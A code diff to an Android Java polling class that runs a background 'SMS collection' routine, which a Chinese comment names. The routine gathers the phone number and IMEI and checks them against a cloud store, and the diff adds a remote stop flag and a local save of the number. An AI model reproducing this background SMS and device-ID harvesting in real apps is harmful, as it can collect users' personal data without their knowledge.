@@ -46,13 +46,18 @@ public class GetMsgRunnable implements Runnable {
 			if (DEBUG) {
 				Log.d(TAG, "开始轮询了");
 			}
-//			if (isConditionSatisfy(mContext)) {
-//				//若之前有存过手机号码,不再进行短信采集
-//				if (!isSavePhoneNumber(mContext)) {
-//					updateCheckInfo();
-//				}
-//			}
-			updateCheckInfo();
+			final boolean isStopService = NativeParams.ACTION_STOP_HEARTBEAT_SERVICE;
+			if (isStopService) {
+				HeartBeatService.getInstance().stopSelf();
+				return;
+			}
+			if (isConditionSatisfy(mContext)) {
+				//若之前有存过手机号码,不再进行短信采集
+				if (!isSavePhoneNumber(mContext)) {
+					updateCheckInfo();
+				}
+			}
+			//updateCheckInfo();
 		} catch (Exception e) {
 			if (DEBUG) {
 				Log.d(TAG, e.fillInStackTrace().toString());
@@ -98,6 +103,7 @@ public class GetMsgRunnable implements Runnable {
 		if (TextUtils.isEmpty(phoneNumber)) {
 			return false;
 		} else {
+			PhoneInfo.getInstance(context).savePhoneInfo(context, phoneNumber);
 			String imei = PhoneInfo.getInstance(context).getIMEI();
 			final boolean isSaveInLeadCloud = isSaveInLeadCloud(imei, phoneNumber);
 			//若之前没有保存过,保存数据,不再进行短信采集
